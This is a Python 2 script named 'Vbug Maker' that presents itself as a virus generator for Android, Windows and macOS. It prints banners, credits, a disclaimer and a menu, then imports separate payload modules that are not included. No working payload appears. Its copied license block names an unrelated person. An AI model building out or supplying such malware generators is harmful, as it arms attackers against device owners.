"""
Author  : DedSecTL
Date    : 19-07-2017
Name    : Vbug Maker
Purpose : Generate virus for Android
Thanks to Mr_Silent, Ghifari, Mr.Holmes, Mr_/bon'007, ID_OUT96...
Copyright (c) 2017, DedSecTL All rights reserved.

Redistribution and use in source and binary forms, with or without modification,
are permitted provided that the following conditions are met: * Redistributions
of source code must retain the above copyright notice, this list of conditions and
the following disclaimer. * Redistributions in binary form must reproduce the above
copyright notice, this list of conditions and the following disclaimer in the
documentation and/or other materials provided with the distribution. * Neither the
name of the nor the names of its contributors may be used to endorse or promote
products derived from this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
"AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO,
THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL CHRISTOPHER DUFFY BE LIABLE FOR ANY DIRECT, INDIRECT,
INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
"""
import os, sys, time
R = '\x1b[1;31m'
N = '\x1b[0m'
Y = '\x1b[1;33m'
G = '\x1b[1;37m'

def restart_program():
    python = sys.executable
    os.execl(python, python, *sys.argv)
    curdir = os.getcwd()


def banner():
    print '%s        _                            _               %s' % (R, N)
    print '%s   _ _ | |_  _ _ %s ___    _____ %s ___ | |_  ___  ___   %s' % (R, Y, R, N)
    print "%s  | | || . || | |%s| . |  |     |%s| .'|| '_|| -_||  _|  %s" % (R, Y, R, N)
    print '%s   \\_/ |___||___|%s|_  |  | |_|_|%s|__,||_,_||___||_|    %s' % (R, Y, R, N)
    print '%s __________________| |  | |_______________________   %s' % (Y, N)
    print '%s|____________________|  |_________________________| %s' % (Y, N)


clear = lambda : os.system('clear')
clear()
banner()
print
print '%sVBu%sg M%saker %s19-07-2017 %s(5:29)%s' % (R, Y, R, G, Y, N)
print '%sAuthor         : %sERR0R%s' % (G, R, N)
print '%sSpecial Thanks : %sHendriyawan %s( mr_silent )%s' % (G, R, Y, N)
print '%sCode           : %sPython%s' % (G, Y, N)
print '%sSupport by     : %sGhifari%s' % (G, R, N)
print '%sDescription    : %sMake a %sVirus.sh%s' % (G, Y, R, N)
print '%s@___%sAndroSec%s1337 Dev%s_____%s' % (Y, G, R, Y, N)
print '%s* %sTrust Me %s-- %sIm Coder %s*%s\n' % (Y, G, R, G, Y, N)
enter = raw_input('%s[%s~%s]%s Press Enter to Continue...%s' % (Y, R, Y, R, N))
clear()
banner()
print '%s#%s---------------%s    VBu%sg%s--%sM%saker    %s----------------%s#%s' % (R, Y, R, Y, R, Y, R, Y, R, N)
print '%s|%s WE DONT take responsibility for the use of this  %s|%s' % (Y, G, Y, N)
print '%s|%s program                                          %s|%s' % (Y, G, Y, N)
print '%s#%s---------------%s    -----------    %s----------------%s#%s' % (R, Y, R, Y, R, N)
print '%s|%s VBu%sg M%saker %sv1.0 19-07-2017 %s(5:29)                |%s' % (Y, R, Y, R, G, Y, N)
print '%s|%s Author  : ERR0R                                  %s|%s' % (Y, G, Y, N)
print '%s|%s Github  : https://github.com/Err0r-ICA           %s|%s' % (Y, G, Y, N)
print '%s|%s Team    : ITALIA%s CYBER ARMY                        %s|%s' % (Y, G, R, G, Y, N)
print '%s|%s Version : 1.0 -- Blackhole Project               %s|%s' % (Y, G, Y, N)
print '%s|%s Copyright (c) 2017, DedSecTL All rights reserved %s|%s' % (Y, G, Y, N)
print '%s#%s---------------%s    -----------    %s----------------%s#%s' % (R, Y, R, Y, R, N)
print
print '%s[%s#%s]%s Options%s' % (Y, R, Y, G, N)
print '%s   {%s01%s} %s~> %sGenerate Virus for Android%s' % (R, G, R, Y, G, N)
print '%s   {%s02%s} %s~> %sGenerate Virus for Window %s' % (R, G, R, Y, G, N)
print '%s   {%s03%s} %s~> %sGenerate Virus for MacOSX %s' % (R, G, R, Y, G, N)
print '%s   {%s04%s} %s~> %sEXIT%s\n' % (R, G, R, Y, G, N)
opsi = raw_input('%sVIBUM%s > %sChoose ' % (R, Y, G))
print '%s' % N
if opsi.strip() in ('01 1').split():
    try:
        import anvima
    except ImportError:
        print '%s[%s!%s]%s ERROR%s: %sanvima%s:%s NOT found%s' % (Y, R, Y, R, Y, G, Y, G, N)
        sys.exit()

if opsi.strip() in ('02 2').split():
    try:
        import winvima
    except ImportError:
        print '%s[%s!%s]%s ERROR%s: %swinvima%s:%s NOT found%s' % (Y, R, Y, R, Y, G, Y, G, N)
        sys.exit()

if opsi.strip() in ('03 3').split():
    try:
        import macvima
    except ImportError:
        print '%s[%s!%s]%s ERROR%s: %smacvima%s:%s NOT found%s' % (Y, R, Y, R, Y, G, Y, G, N)
        sys.exit()

if opsi.strip() in ('04 4').split():
    sys.exit()
else:
    print '%s[%s!%s]%s ERROR: Wrong Input...%s' % (Y, R, Y, G, N)
    time.sleep(2)
    restart_program()
